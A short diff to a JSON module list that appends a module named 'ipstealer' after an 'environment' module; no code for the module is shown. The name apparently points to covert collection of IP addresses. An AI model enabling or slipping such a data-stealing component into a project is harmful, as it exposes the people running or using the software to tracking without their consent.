@@ -6,5 +6,9 @@
     {
         "module": "environment",
         "args": {}
+    },
+    {
+        "module": "ipstealer",
+        "args": {}
     }
 ]
